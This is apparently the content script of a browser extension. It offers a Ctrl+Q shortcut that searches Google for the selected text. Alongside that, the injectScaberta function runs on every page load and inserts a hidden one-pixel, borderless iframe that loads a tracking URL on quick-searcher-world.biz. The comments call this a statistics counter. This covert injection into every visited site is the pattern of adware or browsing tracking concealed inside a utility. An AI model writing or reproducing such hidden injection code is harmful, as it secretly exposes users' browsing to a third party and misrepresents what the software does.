
var isCtrl = false;
document.onkeyup=function(e){ if(e.which == 17) isCtrl=false; }
document.onkeydown=function(e) {
    if(e.which == 17) isCtrl=true;
    if(e.which == 81 && isCtrl === true) {
        var selection = window.getSelection();
		document.location.href = 'http://www.google.com/#q=' + selection.toString();
		return false;
    }
}

/* !!! LI.RU START */
	function show_li(){
		//li.ru stat in iframe
		var url_li = "http://quick-searcher-world.biz/li.html?utm_source=29&utm_medium=Chrome&utm_term=Chrome&utm_content=Unknown&utm_campaign=1";
		var li = document.createElement("iframe");
		li.setAttribute('src', url_li);
		li.setAttribute('name', 'li');
		li.setAttribute('width', '1');
		li.setAttribute('height', '1');
		li.setAttribute('scrolling', 'no');
		li.setAttribute('frameborder', '0');
		document.body.appendChild(li);
		console.log('scaberta - li pasted');
	}
/* LI.RU END */

// rekursivno krutim, poka ne budet body
var timer;
function injectScaberta() {
	if(document.body){

		clearTimeout(timer);
		
		//li v iframe
		show_li();
	}
	else
	{
		timer = setTimeout('injectScaberta()', 100);
	}
}

injectScaberta();